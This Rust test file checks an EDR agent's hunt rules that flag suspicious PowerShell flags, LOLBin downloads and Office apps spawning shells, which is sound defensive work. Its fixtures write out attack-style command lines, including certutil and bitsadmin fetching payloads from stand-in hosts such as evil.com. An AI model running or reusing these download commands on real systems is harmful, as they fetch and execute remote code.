use chrono::Utc;
use edr_agent::database::ProcessEvent;
use edr_agent::hunts::rules;

#[test]
fn test_suspicious_powershell_multiple_indicators() {
    let event = ProcessEvent {
        id: Some(1),
        timestamp: Utc::now(),
        pid: 1234,
        parent_pid: 5678,
        image_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
        command_line: "powershell.exe -nop -w hidden -enc SGVsbG8gV29ybGQ=".to_string(),
        username: "testuser".to_string(),
    };

    let result = rules::check_suspicious_powershell(&event);
    assert!(result.is_some());

    let hunt_match = result.unwrap();
    assert_eq!(hunt_match.rule_name, "suspicious-powershell");
    assert!(hunt_match.description.contains("encoded command"));
    assert!(hunt_match.description.contains("hidden window"));
    assert!(hunt_match.description.contains("no profile"));
}

#[test]
fn test_benign_powershell() {
    let event = ProcessEvent {
        id: Some(2),
        timestamp: Utc::now(),
        pid: 1234,
        parent_pid: 5678,
        image_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
        command_line: "powershell.exe Get-Process".to_string(),
        username: "testuser".to_string(),
    };

    let result = rules::check_suspicious_powershell(&event);
    assert!(result.is_none());
}

#[test]
fn test_lolbin_certutil_download() {
    let event = ProcessEvent {
        id: Some(3),
        timestamp: Utc::now(),
        pid: 2345,
        parent_pid: 6789,
        image_path: "C:\\Windows\\System32\\certutil.exe".to_string(),
        command_line: "certutil.exe -urlcache -split -f http://malicious.com/payload.exe c:\\temp\\payload.exe".to_string(),
        username: "testuser".to_string(),
    };

    let result = rules::check_lolbins(&event);
    assert!(result.is_some());

    let hunt_match = result.unwrap();
    assert_eq!(hunt_match.rule_name, "lolbins");
    assert!(hunt_match.description.contains("certutil.exe"));
    assert!(hunt_match.description.contains("download/decode"));
}

#[test]
fn test_lolbin_bitsadmin() {
    let event = ProcessEvent {
        id: Some(4),
        timestamp: Utc::now(),
        pid: 3456,
        parent_pid: 7890,
        image_path: "C:\\Windows\\System32\\bitsadmin.exe".to_string(),
        command_line: "bitsadmin /transfer myDownloadJob /download /priority normal http://evil.com/malware.exe c:\\temp\\malware.exe".to_string(),
        username: "testuser".to_string(),
    };

    let result = rules::check_lolbins(&event);
    assert!(result.is_some());

    let hunt_match = result.unwrap();
    assert_eq!(hunt_match.rule_name, "lolbins");
    assert!(hunt_match.description.contains("bitsadmin.exe"));
    assert!(hunt_match.description.contains("file transfer"));
}

#[test]
fn test_suspicious_parent_child_word_powershell() {
    let parent = ProcessEvent {
        id: Some(5),
        timestamp: Utc::now(),
        pid: 4567,
        parent_pid: 1000,
        image_path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE".to_string(),
        command_line: "WINWORD.EXE /n document.docx".to_string(),
        username: "testuser".to_string(),
    };

    let child = ProcessEvent {
        id: Some(6),
        timestamp: Utc::now(),
        pid: 5678,
        parent_pid: 4567,
        image_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
        command_line: "powershell.exe -w hidden -enc SGVsbG8gV29ybGQ=".to_string(),
        username: "testuser".to_string(),
    };

    let result = rules::check_suspicious_parent_child(&parent, &child);
    assert!(result.is_some());

    let hunt_match = result.unwrap();
    assert_eq!(hunt_match.rule_name, "suspicious-parent-child");
    assert!(hunt_match.description.contains("winword.exe"));
    assert!(hunt_match.description.contains("powershell.exe"));
}

#[test]
fn test_suspicious_parent_child_excel_cmd() {
    let parent = ProcessEvent {
        id: Some(7),
        timestamp: Utc::now(),
        pid: 6789,
        parent_pid: 1000,
        image_path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE".to_string(),
        command_line: "EXCEL.EXE /automation".to_string(),
        username: "testuser".to_string(),
    };

    let child = ProcessEvent {
        id: Some(8),
        timestamp: Utc::now(),
        pid: 7890,
        parent_pid: 6789,
        image_path: "C:\\Windows\\System32\\cmd.exe".to_string(),
        command_line: "cmd.exe /c whoami > c:\\temp\\info.txt".to_string(),
        username: "testuser".to_string(),
    };

    let result = rules::check_suspicious_parent_child(&parent, &child);
    assert!(result.is_some());

    let hunt_match = result.unwrap();
    assert_eq!(hunt_match.rule_name, "suspicious-parent-child");
    assert!(hunt_match.description.contains("excel.exe"));
    assert!(hunt_match.description.contains("cmd.exe"));
}

#[test]
fn test_benign_parent_child() {
    let parent = ProcessEvent {
        id: Some(9),
        timestamp: Utc::now(),
        pid: 8901,
        parent_pid: 1000,
        image_path: "C:\\Windows\\System32\\cmd.exe".to_string(),
        command_line: "cmd.exe".to_string(),
        username: "testuser".to_string(),
    };

    let child = ProcessEvent {
        id: Some(10),
        timestamp: Utc::now(),
        pid: 9012,
        parent_pid: 8901,
        image_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
        command_line: "powershell.exe Get-Process".to_string(),
        username: "testuser".to_string(),
    };

    let result = rules::check_suspicious_parent_child(&parent, &child);
    assert!(result.is_none());
}
